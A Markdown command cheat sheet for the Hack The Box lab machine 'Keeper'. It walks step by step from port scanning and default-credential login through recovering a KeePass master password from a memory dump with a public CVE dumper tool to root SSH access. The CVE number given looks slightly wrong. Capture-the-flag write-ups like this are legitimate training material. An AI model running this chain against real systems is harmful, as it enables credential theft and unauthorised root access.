# 💎 HTB: Keeper - Command Notes

## 🔍 Recon

```bash
nmap -p- --min-rate 10000 10.10.11.227          # Full port scan
nmap -p 22,80 -sCV 10.10.11.227                 # Version and script scan
ffuf -u http://10.10.11.227 -H "Host: FUZZ.keeper.htb" \
     -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac -mc all
echo "10.10.11.227 keeper.htb tickets.keeper.htb" | sudo tee -a /etc/hosts
```

---

## 🔐 Request Tracker Access

```text
URL: http://tickets.keeper.htb/rt/
Username: root
Password: password
```

> Default credentials work. One support ticket reveals a KeePass memory dump.

---

## 🧑‍💻 Shell as lnorgaard

```bash
sshpass -p 'Welcome2023!' ssh lnorgaard@keeper.htb
cat user.txt
```

---

## 🧠 KeePass Dump Analysis

Files found:

```bash
scp lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip .
unzip RT30000.zip
# -> KeePassDumpFull.dmp (RAM dump)
# -> passcodes.kdbx (KeePass database)
```

---

## 📥 CVE-2022-32784 - KeePass Password Disclosure

**References:**

- [GitHub - vdohney/keepass-password-dumper](https://github.com/vdohney/keepass-password-dumper)

### 🪟 Windows (DotNet)

```powershell
git clone https://github.com/vdohney/keepass-password-dumper
cd keepass-password-dumper
dotnet run Z:\path\to\KeePassDumpFull.dmp
```

### 🐧 Linux (Docker workaround)

```bash
docker run --rm -it -v $(pwd):/data mcr.microsoft.com/dotnet/sdk:7.0.100
git clone https://github.com/vdohney/keepass-password-dumper
cd keepass-password-dumper
dotnet run /data/KeePassDumpFull.dmp
```

> Recovers: `●rødgrød med fløde`

---

## 🔓 KeePass Access

```bash
apt install kpcli
kpcli --kdb passcodes.kdbx
# Master password: rø dgrød med fløde
```

Useful credentials:

- **User:** root  
- **Notes:** PuTTY private key in legacy format

---

## 🔁 PuTTY to OpenSSH Key Conversion

```bash
apt install putty-tools
puttygen root-putty.key -O private-openssh -o keeper-root.key
chmod 600 keeper-root.key
```

---

## 🧑‍🚀 Root Access

```bash
ssh -i keeper-root.key root@keeper.htb
cat /root/root.txt
```